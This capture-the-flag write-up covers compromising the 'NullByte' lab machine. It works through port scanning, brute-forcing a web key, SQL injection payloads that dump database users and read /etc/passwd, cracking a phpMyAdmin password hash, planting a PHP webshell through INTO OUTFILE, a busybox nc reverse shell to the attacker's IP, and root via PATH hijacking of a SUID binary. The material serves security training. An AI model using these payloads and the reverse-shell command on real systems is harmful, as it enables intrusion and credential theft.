NullByte

Target IP: 192.168.177.16
Challenge Description: Terminates strings in C. Also breaks a bunch of things.

Reconnaissance


Performing a TCP port scan using the command sudo nmap -sS 192.168.177.16 -p- returns the result shown in the image above. There are four TCP ports open on the target machine.


I ran an aggressive TCP port scan against the four TCP ports using the command sudo nmap -sV -A 192.168.177.16 -p 80,111,777,34610 and retrieved the output shown in the image above. Web application by the name Null Byte 00 - level 1 is being served at port 80. The web server application is Apache httpd 2.4.10. On ports 111 and 34610, RPC is active. Then on port 777, the SSH application OpenSSH 6.7p1 Debian 5 is being served.

Enumeration

Port 80: HTTP

The webpage shown in the picture above is returned for this web application on port 80. The source of the web application does not contain anything useful. I downloaded the picture on my machine.


Checking the metadata of the main.gif file contains the information shown in the image above. The entry Comment stands out to me, as the value is P-): kzMb5nVYJw. This metadata has been edited by a user.


I performed a directory search using the command feroxbuster -u http://192.168.177.16/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,zip,jpg,yml,js,sql -d 6 --scan-dir-listings -C 404 and obtained the entries shown in the picture above. Most of the result from directory search is phpmyadmin. I also notice the /uploads directory. I am unable to access the contents of /uploads directory however.


While the directory search is running, I checked the phpmyadmin application by browsing to http://192.168.177.16/phpmyadmin. The webpage shown above is returned to me. I tried default credentials root and no password, but I had no luck. I also tried to login using the default credentials like root:root, admin:root, root:admin, etc., but I had no luck.


Thinking laterally, maybe the key is a directory? When I tried to browse to the http://192.168.177.16/kzMb5nVYJw, the webpage shown in the picture above is returned to me. There is one input field with the label Key: . Checking the source code of the webpage contains the developer comment this form isn't connected to mysql, password ain't that complex. I tried the same key kzMb5nVYJw, but I had no luck. The developer comment mentions the password is not that complex, so I will attempt to bruteforce it. When checking the network requests inside the developer tools of my browser, I notice it makes a POST request.


To bruteforce the key, I used ffuf. Since this is a POST request, I used the command ffuf -w /usr/share/wordlists/rockyou.txt -X POST -d "key=FUZZ" -u http://192.168.177.16/kzMb5nVYJw/index.php -H "Content-Type: application/x-www-form-urlencoded" -fw 19. And bingo. It managed to successfully find the key/password elite.


The password elite worked successfully as I managed to login to the web application. Right after, the webpage shown in the picture above is presented to me. This part of the application allows me to search for users using their username. Is this a database application? If so, it could be vulnerable to SQL injection.

Exploitation

Exploitation: Performing SQL Injection to Obtain phpMyAdmin Credentials

I sent the input "' and received the SQL error message shown in the picture above. This is a usual sign the application is vulnerable to SQL injection. The full error message is Could not get data: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''%"' at line 1.


When checking for valid usernames, I just entered the input a and received the output shown in the picture above. An employee called ramses exists so far. The output also shows three information: employee ID, employee name, and employee position. This could indicate there are three columns in the web application. Now I know the web application is vulnerable to SQL injection. Time to identify how many columns there are and check the databases.


To enumerate the number of columns, I used the " ORDER BY <NUMBER>-- // statement. I successfully identified the number of columns is 3 using the payload " ORDER BY 3-- //. Any higher than three (such as " ORDER BY 4-- //) causes the application to throw an error, as shown in the image above on the bottom web browser. Now I know there are three columns, time to enumerate the web application further.


Before enumerating the database, I ran the basic query " UNION SELECT USER(), DATABASE(), @@VERSION-- // as shown in the image above. This output the following:

EMP ID :root@localhost
EMP NAME : seth
EMP POSITION : 5.5.44-0+deb8u1 
EMP ID :root@localhost
EMP NAME : seth
EMP POSITION : 5.5.44-0+deb8u1

It seems like the SQL application is being run as root. The database name is seth. And the SQL application version is 5.5.44-0+deb8u1.


To check what databases exist, I sent the payload " UNION SELECT schema_name, null, null from INFORMATION_SCHEMA.SCHEMATA-- // as shown in the image above. There are five databases: information_schema, mysql, performance_schema, phpmyadmin, and seth. I completely forgot, but this SQL injection opens a new attack vector against the phpmyadmin application. If I can obtain the credentials, I might be able to take control of phpmyadmin. But this database is huge. I will check the seth database first.


Running the query " UNION SELECT TABLE_NAME, TABLE_SCHEMA, null from INFORMATION_SCHEMA.TABLES where table_schema='seth'-- // returns the output shown in the picture above. There is one table called users inside the database seth. Now I need to identify the columns inside this users table.


Using the payload " UNION SELECT COLUMN_NAME, TABLE_NAME, TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='users'-- //, I obtained the columns information. There are four columns inside this users table: id, user, pass, and position. Now I can try to get the contents of the table.


Running the query " UNION SELECT user, pass, null FROM users-- // returns the output shown in the image above. I successfully obtained the possible password YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE that belongs to the user ramses. However, this was a dead end as I was not able to SSH into the target machine using this new password.


Using the LOAD_FILE function and the query " UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3-- //, I was able to read the content of /etc/passwd file as shown in the image above. There are three user created accounts on the target machine: bob, eric, and ramses. Time to enumerate further.


After not being able to login via SSH, I checked the mysql.user table using the query " UNION SELECT user, password, authentication_string FROM mysql.user-- //. And I obtained the result shown in the picture above. I notice the users root and phpmyadmin are using the same hashed password 18DC78FB0C441444482C7D1132C7A23D705DAFA7.


After passing the string 18DC78FB0C441444482C7D1132C7A23D705DAFA7 to Crackstation, I obtained the string sunnyvale as shown in the image above. Now I have the credentials root:sunnyvale of the phpmyadmin application.

Exploitation: PHP Webshell Upload via OUTFILE Statement

And bingo! I managed to login to the phpmyadmin application using the credentials root:sunnyvale. After logging in successfully, the webpage shown above is presented to me. Now I have access to this application as the user root. I can use the SQL Query feature to run my queries without having to perform SQL injection.


Since this user has the privileges to read files on the server, I decided to check if I can write files too. Usually there are three requirements when writing a file on the server: FILE privilege is enabled, secure_file_priv variable is not enabled, and write access to the location we want to write on the back-end server. And using the query SELECT variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"; returns the output shown in the image above. The SECURE_FILE_PRIV is blank which means I have write privileges. Previously, I also found the /uploads directory. Maybe I can upload my files there?


I ran the query SELECT 'pwned!' INTO OUTFILE '/var/www/html/uploads/pwned.txt'; and got the output above. This query ran successfully and my test file was uploaded at /var/www/html/uploads location. Then I accessed this file by browsing to http://192.168.177.16/uploads/pwned.txt as shown in the image above on the web browser. Time to upload a PHP webshell and obtain a reverse shell connection now :)


To place my PHP webshell on the server, I ran the query SELECT '<?php echo system($_GET["cmd"]);?>' INTO OUTFILE '/var/www/html/uploads/sh3ll.php';. This query writes the PHP code <?php echo system($_GET["cmd"]);?> to the file sh3ll.php at /var/www/html/uploads/ directory. After this query ran successfully, I browsed to http://192.168.177.16/uploads/sh3ll.php to access my PHP webshell as shown in the picture above on the web browser. And bingo. Now I have achieved remote code execution on the target machine. Time to obtain a reverse shell connection. I started a listener on my machine at port 80.


I tried PHP reverse shells, but the connection kept dropping out. However, busybox reverse shell worked. Using my PHP webshell, I deployed the URL encoded reverse shell busybox%20nc%20192.168.45.206%2080%20-e%20%2Fbin%2Fbash. The full URL with the busybox reverse shell payload is http://192.168.177.16/uploads/sh3ll.php?cmd=busybox nc 192.168.45.206 80 -e %2Fbin%2Fbash. Right away, I obtained a reverse shell connection on my machine at port 80 with the session as www-data as shown in the image above. Time to elevate my privileges now.

Privilege Escalation

Vertical Privilege Escalation: User www-data to User root via procwatch Weak SUID Misconfiguration & Path Abuse

Running the command find / -perm -u=s -type f 2>/dev/null returns the output shown in the image above. There is an interesting entry by the name /var/www/backup/procwatch. This custom application has SUID bit set.


I browsed to /var/www/backup and found two files: procwatch and readme.txt. This text file contains the message I have to fix this mess.... Since the binary is owned by root. Let's see what this does.


To run the binary, I ran the command ./procwatch. And this strangely output two other applications: sh and ps as root. Immediately Path Abuse comes to my mind.


After some trial and error, I escalated my privileges to root. Firstly, I used the following commands to change the PATH variable: PATH=.:${PATH} and then export PATH. I ran these commands inside the /var/www/uploads directory. Since ps and sh are being executed with root privileges, I ran the command echo '/bin/sh' > ps to insert the /bin/sh shell inside the ps. Then I changed the permission of ps to be executable using the command chmod 777 ps. Afterwards, I ran ./procwatch to execute the procwatch. This instantly opened a root shell for me as shown in the image above. Now I have a root shell on the target machine :) The SQL injection was the most fun part of the box.
